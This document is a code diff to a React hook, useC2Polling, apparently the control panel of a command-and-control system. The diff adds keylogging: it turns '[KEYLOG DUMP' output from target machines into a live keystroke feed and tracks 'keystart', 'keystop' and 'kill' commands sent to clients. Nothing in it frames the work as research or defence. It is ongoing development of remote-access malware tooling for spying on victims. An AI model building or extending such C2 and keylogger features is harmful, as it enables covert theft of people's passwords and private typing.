@@ -23,6 +23,8 @@ interface UseC2PollingOpts {
   mergeAppIcons: (icons: Record<string, string>) => void;
   parseFileList: (output: string) => void;
   appendTermLog: (lines: string[]) => void;
+  appendKeylogChunk: (chunk: string) => void;
+  setIsKeylogStreaming: (v: boolean) => void;
   setC2ConnectionStatus: (s: 'connected' | 'connecting' | 'error') => void;
   showToast: (msg: string) => void;
 }
@@ -35,6 +37,7 @@ export function useC2Polling(opts: UseC2PollingOpts) {
     setPreviewOpen, setPreviewData, setIsPreviewLoading,
     setAppsList, setIsAppsLoading, mergeAppIcons,
     parseFileList, appendTermLog,
+    appendKeylogChunk, setIsKeylogStreaming,
     setC2ConnectionStatus, showToast,
   } = opts;
 
@@ -111,12 +114,24 @@ export function useC2Polling(opts: UseC2PollingOpts) {
       trackId(log.id);
       if (!fromTarget) return;
       parseFileList(log.output);
+    } else if (log.output.startsWith('[KEYLOG DUMP')) {
+      // Auto/manual keydump → keystroke feed, not the terminal echo
+      trackId(log.id);
+      if (!fromTarget) return;
+      const nl = log.output.indexOf('\n');
+      const body = nl >= 0 ? log.output.slice(nl + 1) : '';
+      if (body.trim()) appendKeylogChunk(body.endsWith('\n') ? body : `${body}\n`);
+    } else if (log.command === 'keystart' || log.command === 'keystop' || log.command === 'kill') {
+      trackId(log.id);
+      setIsKeylogStreaming(log.command === 'keystart');
+      const cmdLabel = log.command;
+      appendTermLog([`\n[${cmdLabel}] ${log.client_id}`, log.output]);
     } else if (log.status === 'SUCCESS' && log.output && !log.output.startsWith('Queued')) {
       trackId(log.id);
       const cmdLabel = log.command || 'Command';
       appendTermLog([`\n[${cmdLabel}] ${log.client_id}`, log.output]);
     }
-  }, [noteLogId, trackId, setPreviewData, setIsPreviewLoading, setPreviewOpen, setAppsList, setIsAppsLoading, mergeAppIcons, setProcessList, setIsProcessesLoading, parseFileList, appendTermLog]);
+  }, [noteLogId, trackId, setPreviewData, setIsPreviewLoading, setPreviewOpen, setAppsList, setIsAppsLoading, mergeAppIcons, setProcessList, setIsProcessesLoading, parseFileList, appendTermLog, appendKeylogChunk, setIsKeylogStreaming]);
 
   useEffect(() => {
     // While SSE is live it delivers instantly; polling becomes a 10s safety net.
